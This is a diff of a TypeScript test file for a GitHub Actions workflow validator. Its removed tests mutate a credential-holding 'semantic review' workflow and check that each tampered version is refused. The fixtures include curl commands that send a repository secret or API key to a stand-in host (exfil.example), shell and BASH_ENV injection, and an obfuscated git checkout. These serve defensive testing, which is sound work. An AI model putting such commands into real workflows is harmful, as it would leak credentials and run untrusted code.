-    const directory = mkdtempSync(join(tmpdir(), 'sourdaw-semantic-coverage-'));
-    const reportDirectory = join(directory, 'semantic-review');
-    mkdirSync(reportDirectory, { recursive: true });
-    if (options.report !== undefined) {
-        writeFileSync(join(reportDirectory, 'scan.json'), options.report);
-    }
-    const outputPath = join(directory, 'github-output');
-    writeFileSync(outputPath, '');
-    const compute = stepNamed(jobAt(semanticReviewWorkflow, 'assess'), 'Compute the coverage line');
-    const annotate = stepNamed(jobAt(semanticReviewWorkflow, 'coverage'), 'Publish the withheld paths');
-    const environment = { ...process.env, RUNNER_TEMP: directory };
-    const computeResult = spawnSync('bash', ['-c', stringAt(compute, 'run')], {
-        encoding: 'utf8',
-        env: { ...environment, GITHUB_OUTPUT: outputPath },
-        shell: false,
-    });
-    const annotateResult = spawnSync('bash', ['-c', stringAt(annotate, 'run')], {
-        encoding: 'utf8',
-        env: {
-            ...environment,
-            DOWNLOAD_OUTCOME: options.downloadOutcome ?? 'success',
-            COVERAGE_LINE: options.coverageLine ?? '',
-        },
-        shell: false,
-    });
-    const coverage = readFileSync(outputPath, 'utf8');
-    rmSync(directory, { recursive: true, force: true });
-    return {
-        coverage,
-        notices: annotateResult.stdout,
-        status: computeResult.status === 0 ? annotateResult.status : computeResult.status,
-    };
-}
-
 describe('health gates workflow contract', () => {
     it('registers the hosted quantum producer contract in the global workflow set', () => {
         expect(() => assertHostedQuantumMeasurementWorkflow(hostedQuantumMeasurement)).not.toThrow();
@@ -2471,6 +2415,15 @@ describe('health gates workflow contract', () => {
         const privileged = structuredClone(hostedWasm);
         privileged.on = { pull_request_target: {} };
         expect(() => assertHostedWasmWorkflow(privileged)).toThrow('unprivileged PR trigger');
+        // The paths filter must stay exactly the plan's selection inputs: a
+        // dropped crate would stop a stale package from ever being rebuilt.
+        const narrowed = structuredClone(hostedWasm);
+        const narrowedTrigger = recordAt(recordAt(narrowed, 'on'), 'pull_request');
+        narrowedTrigger.paths = arrayAt(narrowedTrigger, 'paths').filter((path) => path !== 'crates/daw-io/**');
+        expect(() => assertHostedWasmWorkflow(narrowed)).toThrow('filtered to the selection inputs');
+        const unfiltered = structuredClone(hostedWasm);
+        delete recordAt(recordAt(unfiltered, 'on'), 'pull_request').paths;
+        expect(() => assertHostedWasmWorkflow(unfiltered)).toThrow('filtered to the selection inputs');
         const omitted = structuredClone(hostedWasm);
         removeStepNamed(jobAt(omitted, 'build-artifacts'), 'Build and qualify complete artifact');
         expect(() => assertHostedWasmWorkflow(omitted)).toThrow('complete ordered build steps');
@@ -2479,626 +2432,6 @@ describe('health gates workflow contract', () => {
         expect(() => assertHostedWasmWorkflow(unqualified)).toThrow('only qualified output');
     });
 
-    // The advisory review is the only workflow here that holds a paid external
-    // credential, and every one of these mutants is a plausible tidy-up that
-    // would move the head or the key across the trust boundary while leaving
-    // the file looking right.
-    it('keeps the advisory semantic review on the trusted revision and out of the head', () => {
-        expect(() => assertSemanticReviewWorkflow(semanticReviewWorkflow)).not.toThrow();
-
-        // The tempting shape: assess the head by checking it out. It would put
-        // files the change controls in the tree of the job that reads the key.
-        const headCheckout = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(headCheckout, 'assess'), SEMANTIC_REVIEW_CHECKOUT_STEP), 'with').ref =
-            SEMANTIC_REVIEW_HEAD_EXPRESSION;
-        expect(() => assertSemanticReviewWorkflow(headCheckout)).toThrow('a trusted checkout');
-
-        // On `pull_request` GitHub takes the workflow definition from the head,
-        // so the change under review could edit the job that reads the key.
-        const unprivileged = structuredClone(semanticReviewWorkflow);
-        recordAt(unprivileged, 'on').pull_request = {};
-        expect(() => assertSemanticReviewWorkflow(unprivileged)).toThrow(
-            'the privileged pull-request-target trigger and manual dispatch'
-        );
-
-        // A persisted credential leaves a usable token in the tree the job
-        // reads the report from.
-        const persisted = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(persisted, 'assess'), SEMANTIC_REVIEW_CHECKOUT_STEP), 'with')['persist-credentials'] =
-            true;
-        expect(() => assertSemanticReviewWorkflow(persisted)).toThrow(
-            'no persisted credential in the checked-out tree'
-        );
-
-        // Declared on the job, the key reaches the install step as well.
-        const jobKey = structuredClone(semanticReviewWorkflow);
-        jobAt(jobKey, 'assess').env = { [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION };
-        expect(() => assertSemanticReviewWorkflow(jobKey)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // The key has to be the one the command reads, on the step that sends it.
-        const keyless = structuredClone(semanticReviewWorkflow);
-        const keylessAssess = stepNamed(jobAt(keyless, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP);
-        delete recordAt(keylessAssess, 'env')[SEMANTIC_REVIEW_KEY_ENV];
-        expect(() => assertSemanticReviewWorkflow(keyless)).toThrow('the provider key only on the assessment step');
-
-        // A key on any other step is the same leak one step over.
-        const leakedStep = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(leakedStep, 'assess'), 'Upload the advisory report').env = {
-            [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(leakedStep)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // The rearrangement that matters: the credential moves to another step under a new variable
-        // name, so counting the name alone reports the boundary intact. The probe for this one is the
-        // finding it repairs — with only the name counted, this mutant passed every named assertion.
-        const renamedKey = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(renamedKey, 'assess'), 'Report the assessment').env = {
-            LEAKED_JEV: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(renamedKey)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // The spelling the literal match missed. `${{ secrets['JEV_KEY'] }}` is the same credential,
-        // and it walked past a pin that looked for one exact expression.
-        const bracketKey = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(bracketKey, 'assess'), 'Report the assessment').env = {
-            LEAKED_JEV: "${{ secrets['JEV_KEY'] }}",
-        };
-        expect(() => assertSemanticReviewWorkflow(bracketKey)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // And a second variable beside the key on the assessment step, which the whole-environment
-        // pin refuses however it is spelled.
-        const extraAssessVariable = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(extraAssessVariable, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP), 'env').EXTRA = 'x';
-        expect(() => assertSemanticReviewWorkflow(extraAssessVariable)).toThrow(
-            'exactly the provider key and the read-scoped token on the assessment step'
-        );
-
-        // Any repository secret on another step, not only this one.
-        const otherSecret = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(otherSecret, 'assess'), 'Install dependencies').env = {
-            OTHER_TOKEN: '${{ secrets.SOMETHING_ELSE }}',
-        };
-        expect(() => assertSemanticReviewWorkflow(otherSecret)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // And a secret declared for the whole workflow, which every step would then inherit.
-        const workflowSecret = structuredClone(semanticReviewWorkflow);
-        workflowSecret.env = { ...recordAt(workflowSecret, 'env'), INHERITED: '${{ secrets.SOMETHING_ELSE }}' };
-        expect(() => assertSemanticReviewWorkflow(workflowSecret)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-
-        // Enumerating the ways to move a working tree is a list that cannot be finished. Three
-        // revisions of this pin matched text — three subcommands, then the substring `git`, then one
-        // secret spelling — and each fell to a form it did not enumerate. Every executable string is
-        // compared exactly now, so every obfuscation that defeated a search is one case.
-        for (const [label, command] of [
-            ['a reset', 'git reset --hard refs/remotes/pull/${PR_NUMBER}/head'],
-            ['an obfuscated checkout', "g''it checkout refs/remotes/pull/${PR_NUMBER}/head"],
-            ['a curl of the head', 'curl -sO https://example.invalid/head.tar'],
-            ['an unrelated status', 'git status --short'],
-        ] as const) {
-            const appended = structuredClone(semanticReviewWorkflow);
-            const appendix = stepNamed(jobAt(appended, 'assess'), 'Install dependencies');
-            appendix.run = `${String(appendix.run)} && ${String(command)}`;
-            expect(() => assertSemanticReviewWorkflow(appended)).toThrow(
-                'exactly the pinned command in Install dependencies'
-            );
-            expect(label).not.toBe('');
-        }
-
-        // A sixth step that runs anything at all is unpinned, and that is a refusal rather than a
-        // silently accepted addition.
-        const extraRunner = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(extraRunner, 'assess'), 'Set up Node').run = 'echo hello';
-        expect(() => assertSemanticReviewWorkflow(extraRunner)).toThrow('exactly five executable steps');
-
-        // A run supplied as a YAML sequence has the same effect and a different shape, and is refused
-        // as not being the pinned string.
-        const listForm = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(listForm, 'assess'), 'Install dependencies').run = [
-            'pnpm install --frozen-lockfile --ignore-scripts',
-        ];
-        // A non-string run cannot be compared to a pinned command, so it is refused outright
-        // rather than skipped -- which is what let a list-form run through an earlier revision.
-        expect(() => assertSemanticReviewWorkflow(listForm)).toThrow('Install dependencies run must be a string');
-
-        // The head-expression guard needs a mutant that fails *because of it*: assigning the head to
-        // the checkout's ref is refused earlier, by the trusted-checkout assertion.
-        const headInEnvironment = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(headInEnvironment, 'assess'), 'Install dependencies').env = {
-            HEAD_UNDER_REVIEW: SEMANTIC_REVIEW_HEAD_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(headInEnvironment)).toThrow(
-            'must not reference the reviewed head sha'
-        );
-
-        // Reading the environment blocks left the placement class the pin never looked at: a secret
-        // reference inside a step's `run` or its action inputs is evaluated all the same.
-        for (const [label, place] of [
-            [
-                'a run string',
-                (clone: UnknownRecord) => {
-                    const step = stepNamed(jobAt(clone, 'assess'), 'Report the assessment');
-                    // A single-quoted literal: the expression is text here, not interpolation.
-                    const exfiltration = 'curl -s "https://exfil.example/${{ secrets.JEV_KEY }}"';
-                    step.run = `${String(step.run)}\n${exfiltration}`;
-                },
-            ],
-            [
-                'action inputs',
-                (clone: UnknownRecord) => {
-                    const step = stepNamed(jobAt(clone, 'assess'), 'Set up Node');
-                    step.with = { ...asRecord(step.with ?? {}, 'set up node inputs'), token: '${{ secrets.JEV_KEY }}' };
-                },
-            ],
-        ] as const) {
-            const placed = structuredClone(semanticReviewWorkflow);
-            place(placed);
-            // A credential spliced into a pinned command breaks the command's own pin before the
-            // mention count is reached; a pinned action input breaks its own pin; an unpinned one is
-            // caught by the count. Every route refuses.
-            expect(
-                () => assertSemanticReviewWorkflow(placed),
-                `a secret reference in ${label} must be refused`
-            ).toThrow(
-                /exactly the pinned command|must mention a repository secret exactly once|the Node version the assessment runs on/u
-            );
-        }
-
-        // The token's name was pinned and its value was not, so a write-capable personal token under
-        // the same name passed — the tidy-up a rate-limited run invites.
-        const widenedToken = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(widenedToken, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP), 'env').GH_TOKEN =
-            'a personal token';
-        expect(() => assertSemanticReviewWorkflow(widenedToken)).toThrow(
-            'the read-scoped token, and no other, on the assessment step'
-        );
-
-        // The credential-bearing step was pinned by substring, so any appended command passed while
-        // the step still "ran the scan".
-        const exfiltrating = structuredClone(semanticReviewWorkflow);
-        const exfiltratingAssess = stepNamed(jobAt(exfiltrating, 'assess'), SEMANTIC_REVIEW_ASSESS_STEP);
-        exfiltratingAssess.run = `${String(exfiltratingAssess.run)}curl -s "https://exfil.example/$TYPESAFE_API_KEY"`;
-        expect(() => assertSemanticReviewWorkflow(exfiltrating)).toThrow(
-            'exactly the pinned command in Assess the change, and nothing else'
-        );
-
-        // `checks: write` buys nothing here: the check is the job's own, so a
-        // write token would sit beside the key for no reason.
-        const writeToken = structuredClone(semanticReviewWorkflow);
-        recordAt(writeToken, 'permissions').checks = 'write';
-        expect(() => assertSemanticReviewWorkflow(writeToken)).toThrow('read-only repository permissions');
-
-        // Dropping the gate spends the owner's key on a different trust domain.
-        const openToForks = structuredClone(semanticReviewWorkflow);
-        jobAt(openToForks, 'assess').if = '${{ !cancelled() }}';
-        expect(() => assertSemanticReviewWorkflow(openToForks)).toThrow(
-            'its fork, draft, and default-branch eligibility condition'
-        );
-
-        // A renamed check detaches the workflow from the context a reader looks
-        // for, and would collide with the required one.
-        const renamed = structuredClone(semanticReviewWorkflow);
-        jobAt(renamed, 'assess').name = 'Gate';
-        expect(() => assertSemanticReviewWorkflow(renamed)).toThrow('its distinct advisory check name');
-
-        // The coverage job is informational, so a write token beside it buys
-        // nothing; `checks: write` is the tempting addition and is refused.
-        const coverageWrites = structuredClone(semanticReviewWorkflow);
-        recordAt(jobAt(coverageWrites, 'coverage'), 'permissions').checks = 'write';
-        expect(() => assertSemanticReviewWorkflow(coverageWrites)).toThrow('contents: read alone');
-
-        // The coverage job reads the run's artifact and nothing else. A
-        // checkout — even the trusted revision's — is an action this job must
-        // not hold, and an unpinned downloader is the same supply-chain surface
-        // the assessment job's action list refuses.
-        for (const [label, uses] of [
-            ['a checkout', 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1'],
-            ['an unpinned download', 'actions/download-artifact@main'],
-        ] as const) {
-            const wrongAction = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(wrongAction, 'coverage'), 'Download the advisory report').uses = uses;
-            expect(
-                () => assertSemanticReviewWorkflow(wrongAction),
-                `${label} in the coverage job must be refused`
-            ).toThrow('the one pinned action, and no checkout');
-        }
-
-        // The artifact name is what binds the read to this run's own upload; a
-        // widened name can pick up another pull request's report.
-        const widenedArtifact = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(widenedArtifact, 'coverage'), 'Download the advisory report'), 'with').name =
-            'semantic-review';
-        expect(() => assertSemanticReviewWorkflow(widenedArtifact)).toThrow('the artifact this run uploaded');
-
-        // A missing artifact is an expected outcome, so the fetch is softened
-        // and the annotating step reports it. Hardening the fetch back turns
-        // that outcome into a red coverage job that says nothing.
-        const hardenedDownload = structuredClone(semanticReviewWorkflow);
-        delete stepNamed(jobAt(hardenedDownload, 'coverage'), 'Download the advisory report')['continue-on-error'];
-        expect(() => assertSemanticReviewWorkflow(hardenedDownload)).toThrow('the softened artifact fetch');
-
-        // A static coverage name reports a check that no longer says anything
-        // about this run's scope, which is the whole product of the job.
-        const staticCoverageName = structuredClone(semanticReviewWorkflow);
-        jobAt(staticCoverageName, 'coverage').name = 'Jev coverage';
-        expect(() => assertSemanticReviewWorkflow(staticCoverageName)).toThrow(
-            'a coverage name built from the assessment output'
-        );
-
-        // Without the dependency the coverage job reads a run that may not
-        // exist, and without the output its name has nothing to carry.
-        const disconnectedCoverage = structuredClone(semanticReviewWorkflow);
-        delete jobAt(disconnectedCoverage, 'coverage').needs;
-        expect(() => assertSemanticReviewWorkflow(disconnectedCoverage)).toThrow('its dependency on the assessment');
-
-        const alwaysCoverage = structuredClone(semanticReviewWorkflow);
-        jobAt(alwaysCoverage, 'coverage').if = 'always()';
-        expect(() => assertSemanticReviewWorkflow(alwaysCoverage)).toThrow('its run-unless-cancelled condition');
-
-        const outputless = structuredClone(semanticReviewWorkflow);
-        delete jobAt(outputless, 'assess').outputs;
-        expect(() => assertSemanticReviewWorkflow(outputless)).toThrow('its coverage and producer-attempt outputs');
-
-        // The producer's attempt is what the consumer names the artifact from, so
-        // dropping it leaves the download naming an artifact no job uploaded on a
-        // re-run of only the failed jobs.
-        const attemptless = structuredClone(semanticReviewWorkflow);
-        delete recordAt(jobAt(attemptless, 'assess'), 'outputs')[SEMANTIC_REVIEW_ARTIFACT_ATTEMPT_OUTPUT];
-        expect(() => assertSemanticReviewWorkflow(attemptless)).toThrow('its coverage and producer-attempt outputs');
-
-        // The computing step keeps the default success gate. A condition that
-        // would let it run after a failed report publishes a line derived from a
-        // report the upload step never published, so the coverage job could only
-        // contradict the name it was given. Both tempting conditions are refused.
-        for (const [label, condition] of [
-            ['a run-unless-cancelled condition', '${{ !cancelled() }}'],
-            ['an always condition', 'always()'],
-        ] as const) {
-            const gatedCoverage = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(gatedCoverage, 'assess'), 'Compute the coverage line').if = condition;
-            expect(
-                () => assertSemanticReviewWorkflow(gatedCoverage),
-                `${label} on the computing step must be refused`
-            ).toThrow('no step condition beyond the job gate');
-        }
-
-        // The fallback belongs in the consumer's name expression. A job that
-        // never ran never evaluates its outputs mapping, so the old placement is
-        // what leaves the name empty on exactly the skipped and red runs it is
-        // meant to describe, and a name without the fallback is empty there too.
-        const fallbackInProducer = structuredClone(semanticReviewWorkflow);
-        recordAt(jobAt(fallbackInProducer, 'assess'), 'outputs').coverage =
-            "${{ steps.coverage.outputs.coverage || 'no assessment delivered' }}";
-        expect(() => assertSemanticReviewWorkflow(fallbackInProducer)).toThrow(
-            'its coverage and producer-attempt outputs'
-        );
-
-        const fallbacklessName = structuredClone(semanticReviewWorkflow);
-        jobAt(fallbacklessName, 'coverage').name = 'Jev coverage · ${{ needs.assess.outputs.coverage }}';
-        expect(() => assertSemanticReviewWorkflow(fallbacklessName)).toThrow(
-            'a coverage name built from the assessment output'
-        );
-
-        // A step's `shell` is executable and no command pin reads it, so a
-        // command appended there runs beside the pinned one with `run` unchanged
-        // — on the step that holds the provider key as much as any other.
-        for (const [jobId, stepName] of [
-            ['assess', 'Assess the change'],
-            ['coverage', 'Publish the withheld paths'],
-        ] as const) {
-            const shellInjection = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(shellInjection, jobId), stepName).shell = 'bash -c "curl -s https://exfil.example"';
-            expect(
-                () => assertSemanticReviewWorkflow(shellInjection),
-                `a shell override on ${jobId} ${stepName} must be refused`
-            ).toThrow('without a shell override');
-        }
-
-        // The rest of the executable-surface class. A workflow- or job-level
-        // `defaults` replaces the shell every `run` step uses, a job or step
-        // `container` re-environments the job that holds the provider key, and a
-        // job or step `env` can set `BASH_ENV` for a command whose text is pinned.
-        // The snapshot is regenerated as a matter of course, so it cannot be the
-        // only pin for any of them.
-        const workflowDefaults = structuredClone(semanticReviewWorkflow);
-        workflowDefaults.defaults = { run: { shell: 'bash -c "curl -s https://exfil.example"' } };
-        expect(() => assertSemanticReviewWorkflow(workflowDefaults)).toThrow('no workflow-level defaults');
-
-        const workflowEnvironment = structuredClone(semanticReviewWorkflow);
-        recordAt(workflowEnvironment, 'env').BASH_ENV = '/tmp/inject.sh';
-        expect(() => assertSemanticReviewWorkflow(workflowEnvironment)).toThrow('its pinned workflow environment');
-
-        for (const jobId of [SEMANTIC_REVIEW_ASSESS_JOB, SEMANTIC_REVIEW_COVERAGE_JOB] as const) {
-            const jobLabel = jobId === SEMANTIC_REVIEW_ASSESS_JOB ? 'the assessment job' : 'the coverage job';
-            for (const [key, value] of [
-                ['defaults', { run: { shell: 'bash -c "curl -s https://exfil.example"' } }],
-                ['container', { image: 'node:24', env: { BASH_ENV: '/tmp/inject.sh' } }],
-                ['env', { BASH_ENV: '/tmp/inject.sh' }],
-            ] as const) {
-                const injected = structuredClone(semanticReviewWorkflow);
-                jobAt(injected, jobId)[key] = value;
-                expect(
-                    () => assertSemanticReviewWorkflow(injected),
-                    `a job ${key} block on ${jobId} must be refused`
-                ).toThrow(`${jobLabel} without a job ${key} block`);
-            }
-        }
-
-        for (const [jobId, stepName] of [
-            [SEMANTIC_REVIEW_ASSESS_JOB, 'Report the assessment'],
-            [SEMANTIC_REVIEW_COVERAGE_JOB, 'Download the advisory report'],
-        ] as const) {
-            const jobLabel = jobId === SEMANTIC_REVIEW_ASSESS_JOB ? 'the assessment job' : 'the coverage job';
-            const containerStep = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(containerStep, jobId), stepName).container = { image: 'node:24' };
-            expect(
-                () => assertSemanticReviewWorkflow(containerStep),
-                `a step container on ${jobId} ${stepName} must be refused`
-            ).toThrow(`${jobLabel} steps without a step container`);
-
-            const envStep = structuredClone(semanticReviewWorkflow);
-            stepNamed(jobAt(envStep, jobId), stepName).env = { BASH_ENV: '/tmp/inject.sh' };
-            expect(
-                () => assertSemanticReviewWorkflow(envStep),
-                `a step env on ${jobId} ${stepName} must be refused`
-            ).toThrow(`${jobLabel} steps without a step environment`);
-        }
-
-        // The annotating step is the one coverage step with a legitimate
-        // environment, and it is pinned whole: a third variable beside the two
-        // it reads is refused.
-        const annotateExtraEnv = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(annotateExtraEnv, 'coverage'), 'Publish the withheld paths'), 'env').BASH_ENV =
-            '/tmp/inject.sh';
-        expect(() => assertSemanticReviewWorkflow(annotateExtraEnv)).toThrow(
-            'the retrieval outcome and coverage line alone'
-        );
-
-        // Reordering the same three workflow environment entries changes nothing,
-        // and an empty mapping is the same no-op as an absent declaration, so
-        // neither is a boundary change.
-        const reorderedEnvironment = structuredClone(semanticReviewWorkflow);
-        reorderedEnvironment.env = {
-            TRUSTED_SHA: SEMANTIC_REVIEW_ENV.TRUSTED_SHA,
-            NODE_VERSION: SEMANTIC_REVIEW_ENV.NODE_VERSION,
-            PR_NUMBER: SEMANTIC_REVIEW_ENV.PR_NUMBER,
-        };
-        expect(() => assertSemanticReviewWorkflow(reorderedEnvironment)).not.toThrow();
-
-        const emptyDeclarations = structuredClone(semanticReviewWorkflow);
-        emptyDeclarations.defaults = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB).defaults = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB).env = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_COVERAGE_JOB).defaults = {};
-        jobAt(emptyDeclarations, SEMANTIC_REVIEW_COVERAGE_JOB).env = {};
-        stepNamed(jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB), 'Report the assessment').env = {};
-        stepNamed(jobAt(emptyDeclarations, SEMANTIC_REVIEW_ASSESS_JOB), 'Report the assessment').container = {};
-        stepNamed(jobAt(emptyDeclarations, SEMANTIC_REVIEW_COVERAGE_JOB), 'Download the advisory report').env = {};
-        expect(() => assertSemanticReviewWorkflow(emptyDeclarations)).not.toThrow();
-
-        // The upload is pinned before the line is computed, and both sides read
-        // one artifact-name constant: an upload that never ran leaves the line
-        // unpublished, and a renamed upload cannot leave the download fetching an
-        // artifact this run never published.
-        const reorderedAssessSteps = structuredClone(semanticReviewWorkflow);
-        swapStepsNamed(
-            jobAt(reorderedAssessSteps, 'assess'),
-            'Upload the advisory report',
-            'Compute the coverage line'
-        );
-        expect(() => assertSemanticReviewWorkflow(reorderedAssessSteps)).toThrow('its complete ordered steps');
-
-        const driftedUploadName = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(driftedUploadName, 'assess'), 'Upload the advisory report'), 'with').name =
-            'semantic-review';
-        expect(() => assertSemanticReviewWorkflow(driftedUploadName)).toThrow('the artifact this run publishes');
-
-        // A re-run reuses the run id, so the artifact name must be scoped to the
-        // attempt: a run-scoped name would collide with the previous attempt's
-        // immutable artifact, fail the new upload, leave the line on its
-        // fallback, and still let the softened download read the superseded
-        // report. The producer's attempt is carried as a job output, and the
-        // consumer names the artifact from it: a re-run of only the failed jobs
-        // does not re-run `assess`, so the consumer's own `github.run_attempt`
-        // would name an artifact no job uploaded. All three spellings are
-        // refused, and the pins are asserted to carry the right attempt.
-        expect(SEMANTIC_REVIEW_UPLOAD_ARTIFACT_NAME).toContain('${{ github.run_attempt }}');
-        expect(SEMANTIC_REVIEW_DOWNLOAD_ARTIFACT_NAME).toContain(
-            `\${{ needs.assess.outputs.${SEMANTIC_REVIEW_ARTIFACT_ATTEMPT_OUTPUT} }}`
-        );
-        const runScopedArtifact = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(runScopedArtifact, 'assess'), 'Upload the advisory report'), 'with').name =
-            'semantic-review-${{ env.PR_NUMBER }}-${{ github.run_id }}';
-        expect(() => assertSemanticReviewWorkflow(runScopedArtifact)).toThrow('the artifact this run publishes');
-
-        const runScopedDownload = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(runScopedDownload, 'coverage'), 'Download the advisory report'), 'with').name =
-            'semantic-review-${{ env.PR_NUMBER }}-${{ github.run_id }}';
-        expect(() => assertSemanticReviewWorkflow(runScopedDownload)).toThrow('the artifact this run uploaded');
-
-        const consumerAttemptDownload = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(consumerAttemptDownload, 'coverage'), 'Download the advisory report'), 'with').name =
-            'semantic-review-${{ env.PR_NUMBER }}-${{ github.run_id }}-${{ github.run_attempt }}';
-        expect(() => assertSemanticReviewWorkflow(consumerAttemptDownload)).toThrow('the artifact this run uploaded');
-
-        // The setup actions' inputs decide what the pinned commands run on;
-        // nothing else reads them, so the Node version is pinned by name and not
-        // only by the regenerable snapshot.
-        const driftedNode = structuredClone(semanticReviewWorkflow);
-        recordAt(stepNamed(jobAt(driftedNode, 'assess'), 'Set up Node'), 'with')['node-version'] = '24.19.1';
-        expect(() => assertSemanticReviewWorkflow(driftedNode)).toThrow('the Node version the assessment runs on');
-
-        const pnpmInputs = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(pnpmInputs, 'assess'), 'Set up pnpm').with = { version: '11' };
-        expect(() => assertSemanticReviewWorkflow(pnpmInputs)).toThrow('no inputs on the pnpm setup step');
-
-        // The output is read through the step id, so an id that drifts leaves
-        // the job output empty while the step still runs.
-        const wrongId = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(wrongId, 'assess'), 'Compute the coverage line').id = 'line';
-        expect(() => assertSemanticReviewWorkflow(wrongId)).toThrow('the output id its own output is read from');
-
-        // The annotating step was pinned by command, so any appended command
-        // would keep the check name and stop it meaning what it says.
-        const exfiltratingCoverage = structuredClone(semanticReviewWorkflow);
-        const annotate = stepNamed(jobAt(exfiltratingCoverage, 'coverage'), 'Publish the withheld paths');
-        annotate.run = `${String(annotate.run)}curl -s "https://exfil.example"`;
-        expect(() => assertSemanticReviewWorkflow(exfiltratingCoverage)).toThrow(
-            'exactly the pinned annotating command'
-        );
-
-        // The provider key is scoped to the assessment step alone, so the same
-        // credential on the coverage job is refused by the workflow-wide count
-        // however the variable is named.
-        const keyInCoverage = structuredClone(semanticReviewWorkflow);
-        stepNamed(jobAt(keyInCoverage, 'coverage'), 'Publish the withheld paths').env = {
-            [SEMANTIC_REVIEW_KEY_ENV]: SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-        };
-        expect(() => assertSemanticReviewWorkflow(keyInCoverage)).toThrow(
-            'must mention a repository secret exactly once, on the assessment step'
-        );
-    });
-
-    // The `file=` property is identity-bearing, so a control character must be
-    // escaped there, never folded: folding a newline into a space would annotate
-    // a control-character sibling under a real space-named path and attribute
-    // its reason to the wrong file. The shipped commands are executed on exactly
-    // that report, and both properties must come back exact.
-    it('keeps the emitted file property exact beside a real space-named path', () => {
-        const report = JSON.stringify({
-            execution: 'partial',
-            scope: {
-                discovered: 2,
-                eligible: 2,
-                assessed: 0,
-                cacheHits: 0,
-                excluded: [],
-                unassessed: [
-                    { path: 'src/one two.ts', reason: 'budget-exhausted-before-admission' },
-                    { path: 'src/one\ntwo.ts', reason: 'evidence-withheld-sensitive-path' },
-                ],
-                truncated: [],
-            },
-        });
-        const { coverage, notices, status } = runSemanticCoverageLine({ report });
-        expect(status).toBe(0);
-        expect(coverage).toContain('2 distinct path-and-reason pairs');
-        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
-        expect(annotations).toHaveLength(2);
-        expect(annotations.join('\n')).toContain('file=src/one two.ts,line=1::src/one two.ts: ');
-        expect(annotations.join('\n')).toContain('file=src/one%0Atwo.ts,line=1::src/one%0Atwo.ts: ');
-        expect(annotations.join('\n')).toContain('budget-exhausted-before-admission');
-        expect(annotations.join('\n')).toContain('evidence-withheld-sensitive-path');
-        expect(notices).toContain('0 further distinct path-and-reason pairs were not annotated.');
-    });
-
-    // A path routinely carries more than one reason, so a per-path budget would
-    // let a milder reason hide a sensitive one and then report that nothing
-    // further was withheld. Each distinct path-and-reason pair is annotated, the
-    // budget is spent on pairs, and the remainder is counted in the same unit.
-    it('annotates every distinct reason a withheld path carries within the ten-entry budget', () => {
-        const otherPaths = Array.from({ length: 10 }, (_, index) => ({
-            path: `src/other-${String(index)}.ts`,
-            reason: 'no-admissible-evidence',
-        }));
-        const report = JSON.stringify({
-            execution: 'partial',
-            scope: {
-                discovered: 12,
-                eligible: 12,
-                assessed: 0,
-                cacheHits: 0,
-                excluded: [],
-                unassessed: [
-                    { path: 'src/repeated.ts', reason: 'evidence-withheld-sensitive-path' },
-                    { path: 'src/repeated.ts', reason: 'budget-exhausted-before-admission' },
-                    ...otherPaths,
-                ],
-                truncated: [],
-            },
-        });
-        const { coverage, notices, status } = runSemanticCoverageLine({ report });
-        expect(status).toBe(0);
-        expect(coverage).toContain('12 distinct path-and-reason pairs');
-        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
-        expect(annotations).toHaveLength(10);
-        expect(annotations.join('\n')).toContain('file=src/repeated.ts,line=1::src/repeated.ts: ');
-        expect(annotations.join('\n')).toContain('evidence-withheld-sensitive-path');
-        expect(annotations.join('\n')).toContain('budget-exhausted-before-admission');
-        expect(notices).toContain('2 further distinct path-and-reason pairs were not annotated.');
-    });
-
-    // The producer emits one identical path-and-reason entry per over-budget
-    // region of a file, so twelve over-budget hunks of one file are one notice,
-    // not twelve. Identical pairs collapse, every distinct reason stays, and the
-    // trailing notice counts the pairs it did not annotate.
